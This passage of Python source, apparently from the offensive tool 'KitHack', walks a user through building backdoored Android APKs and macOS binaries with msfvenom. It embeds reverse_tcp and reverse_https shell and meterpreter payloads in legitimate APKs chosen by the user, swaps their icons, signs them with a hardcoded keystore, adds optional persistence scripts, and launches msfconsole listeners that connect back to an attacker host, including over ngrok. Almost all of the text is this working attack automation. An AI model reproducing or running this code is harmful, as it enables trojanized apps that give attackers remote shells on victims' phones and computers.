							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
					
					else:
						print("{}\n[X] INVALID OPTION\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] INVALID OPTION\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '06':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)

				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/kithack.apk')
						location = os.getcwd()
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle					
					OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))						
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/kithack.apk')
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("{}\n[X] INVALID OPTION\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] INVALID OPTION\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '07':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)

				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/kithack.apk')
						location = os.getcwd()
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))						
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
			
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)
					
					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()		
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()		

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/kithack.apk')
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("{}\n[X] INVALID OPTION\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] INVALID OPTION\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('clear')
					main()	

			else:
				print("\n{}[X] INVALID OPTION\n".format(RED))
				time.sleep(3)
				pause("{}Press any key to continue...".format(GREEN))
				os.system('clear')
				main()	
												
		elif sys == '04':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} osx/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} osx/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} osx/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} osx/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} osx/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} osx/x86/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
